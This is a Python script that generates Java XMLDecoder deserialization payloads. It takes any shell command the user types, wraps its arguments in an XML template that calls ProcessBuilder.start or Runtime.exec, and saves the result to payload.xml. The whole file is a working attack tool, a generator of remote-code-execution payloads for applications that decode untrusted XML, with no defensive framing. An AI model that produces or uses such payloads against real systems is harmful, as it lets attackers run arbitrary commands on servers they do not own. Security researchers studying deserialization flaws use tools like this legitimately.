#!/usr/bin/python3


payload_template_processbuilder = '<?xml version="1.0" encoding="UTF-8"?> <java version="1.7.0_21" class="java.beans.XMLDecoder"> <void class="java.lang.ProcessBuilder"> <array class="java.lang.String" length="{0}">Template</array> <void method="start" id="process"> </void> </void> </java>'
payload_template_runtime = '<?xml version="1.0" encoding="UTF-8"?> <java version="1.7.0_21" class="java.beans.XMLDecoder"> <object class="java.lang.Runtime" method="getRuntime"> <void method="exec"> <array class="java.lang.String" length="{0}"> Template </array> </void> </object> </java>'


command = input("command >>")
print("\n")
print("1) ProcessBuilder")
print("2) Runtime Exec\n")
template = input("execution method (please choose 1 or 2) >> ")

if template != "1" and template != "2":
    print("Wrong execution method")

command_tokens = command.split()
command_length = len(command_tokens)
main_executable = command_tokens[0]
xml_arguments = []
index = 0


def save_payload(payload):
    f = open("payload.xml", "w")
    f.write(final_payload)
    f.close()
    print("[+] Your payload saved to payload.xml")
    exit()


for argument in command_tokens:
    xml_argument = '<void index="{0}"><string>{1}</string></void>'.format(index, argument)
    xml_arguments.append(xml_argument)
    index = index + 1

final_xml_arguments = "".join(xml_arguments)

if template == "1":
    payload = payload_template_processbuilder.replace("Template", final_xml_arguments)
    final_payload = payload.format(command_length)
    save_payload(final_payload)

elif template == "2":
    payload = payload_template_runtime.replace("Template", final_xml_arguments)
    final_payload = payload.format(command_length)
    save_payload(final_payload)
